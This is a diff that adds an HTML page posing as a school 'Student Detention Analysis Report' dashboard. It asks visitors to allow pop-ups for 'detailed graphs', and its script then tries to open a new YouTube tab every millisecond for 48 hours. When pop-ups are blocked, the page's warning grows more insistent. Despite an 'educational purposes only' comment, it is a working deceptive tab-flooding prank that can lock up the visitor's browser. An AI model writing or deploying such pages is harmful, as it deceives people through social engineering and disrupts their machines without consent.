@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Student Detention Analysis Report - Interactive Graph</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5; /* Light gray background */
+            color: #333; /* Dark text */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: white;
+            padding: 40px 60px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            width: 100%;
+        }
+        h1 {
+            color: #d32f2f; /* Red for detention */
+            margin-bottom: 15px;
+            font-size: 2.2em;
+        }
+        h2 {
+            color: #555;
+            margin-top: 0;
+            margin-bottom: 30px;
+            font-size: 1.4em;
+            font-weight: normal;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .instruction-box {
+            background-color: #fff3e0; /* Light orange */
+            border-left: 5px solid #fb8c00; /* Orange border */
+            padding: 15px 20px;
+            margin-top: 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            color: #e65100; /* Darker orange text */
+            font-size: 1.05em;
+        }
+        .footer-note {
+            margin-top: 40px;
+            font-size: 0.85em;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Student Detention Analysis Report</h1>
+        <h2>Interactive Performance Overview - Academic Year 2026 So Far</h2>
+        <p>
+            Welcome to the interactive detention analysis dashboard. This report provides a visual representation of detention incidents, trends, and impact across various student cohorts.
+            Detailed individual student records and specific incident graphs are available via dynamic data queries.
+        </p>
+        <p>
+            To access the full interactive features, including drill-down student profiles and comparative charts, this report utilizes secure, temporary pop-up windows.
+        </p>
+        <div class="instruction-box">
+            Please allow pop-ups for this page to enable full interactive functionality and view all detailed graphs.
+        </div>
+        <p class="footer-note">
+            Unauthorized access to this report is strictly prohibited. For support, please contact IT Helpdesk.
+        </p>
+    </div>
+
+    <script>
+        // THIS SCRIPT IS FOR EDUCATIONAL PURPOSES ONLY, DEMONSTRATING SOCIAL ENGINEERING CONCEPTS.
+        // IT IS DESIGNED TO DECEIVE. DO NOT USE THIS SCRIPT FOR MALICIOUS PURPOSES OR WITHOUT EXPLICIT CONSENT.
+
+        const rickrollWatchUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        const prankDurationMs = 48 * 60 * 60 * 1000; // 48 hours in milliseconds (prank still self-terminates in theory)
+        const newTabCheckIntervalMs = 1; // Attempt to open a new tab every 1 millisecond
+
+        let prankStartTime = Date.now();
+
+        function openRickrollTab() {
+            // This function will attempt to open a new tab directly to the YouTube video.
+            // Modern browsers still have strong pop-up blockers, which the "instruction-box" aims to bypass
+            // by giving the user a "valid reason" to allow them.
+            const newTab = window.open(rickrollWatchUrl, '_blank', 'noopener,noreferrer');
+            if (newTab) {
+                console.log(`[${new Date().toLocaleTimeString()}] Opened a new "Detailed Graph" tab to: ${rickrollWatchUrl}`);
+            } else {
+                console.warn(`[${new Date().toLocaleTimeString()}] Failed to open "Detailed Graph" tab (pop-up blocker active or user did not allow).`);
+                // Update the visible instruction to be more insistent if pop-ups are blocked
+                const instructionBox = document.querySelector('.instruction-box');
+                if (instructionBox && !instructionBox.textContent.includes("STILL blocked")) {
+                    instructionBox.innerHTML = `<strong>Pop-ups STILL blocked!</strong> Please allow pop-ups for this page for full interactive functionality.`;
+                    instructionBox.style.backgroundColor = '#ffebee'; // Lighter red
+                    instructionBox.style.borderColor = '#ef5350'; // Red border
+                    instructionBox.style.color = '#c62828'; // Darker red text
+                }
+            }
+        }
+
+        // --- Initial Action: Immediately try to open a tab (as if loading initial data) ---
+        openRickrollTab();
+
+        // --- Watchdog-like behavior (within this tab) ---
+        const watchdogInterval = setInterval(() => {
+            const currentTime = Date.now();
+            if (currentTime - prankStartTime >= prankDurationMs) {
+                clearInterval(watchdogInterval);
+                console.log(`[${new Date().toLocaleTimeString()}] Report session duration reached. Disabling interactive features.`);
+                document.body.innerHTML = '<div class="container"><h1>Report Session Ended</h1><h2>Interactive features have been disabled.</h2><p>The 48-hour viewing session has concluded for this report. Please close this tab.</p></div>';
+                return;
+            }
+
+            // Periodically attempt to open more tabs, disguised as "detailed graphs".
+            openRickrollTab(); 
+
+            console.log(`[${new Date().toLocaleTimeString()}] Running background data refresh. Attempting to load new graph. YouTube embed might be blocked.`);
+
+        }, newTabCheckIntervalMs);
+
+        console.log(`[${new Date().toLocaleTimeString()}] Detention Report loaded. Initial data query initiated, interactive session active.`);
+
+    </script>
+</body>
+</html>
